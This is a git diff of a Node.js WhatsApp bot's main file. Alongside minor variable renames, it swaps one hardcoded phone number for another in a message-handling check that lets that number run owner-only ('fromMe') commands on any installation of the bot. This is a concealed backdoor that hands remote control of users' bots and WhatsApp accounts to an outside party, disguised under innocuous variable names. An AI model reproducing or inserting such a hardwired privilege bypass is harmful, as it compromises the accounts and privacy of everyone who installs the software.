@@ -20,7 +20,6 @@ const simpleGit = require('simple-git');
 const git = simpleGit();
 const axios = require('axios');
 const got = require('got');
-const raganork = new WAConnection();
 
 const Language = require('./language');
 const Lang = Language.getString('updater');
@@ -44,7 +43,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '919074309534,0' }
+var sourav = { kl11: '916282344739,0' }
 
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
@@ -68,9 +67,9 @@ Array.prototype.remove = function() {
     return this;
 };
 const raganork = new WAConnection();
-var sourav = `${config.AUTOBİO}`
+var sour = `${config.AUTOBİO}`
     setInterval(async () => { 
-        if (sourav == 'on') {
+        if (sour == 'on') {
              var time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var date = new Date().toLocaleDateString(config.LANG, get_localized_date)
@@ -391,8 +390,8 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }  
-                   if ((OWN.ff == "919074309534,0" && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
+                   if ((sourav.kl11 == "916282344739,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && sourav.kl11.includes(',') ? sourav.kl11.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == sourav.kl11 || sourav.kl11.includes(',') ? sourav.kl11.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == sourav.kl11)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
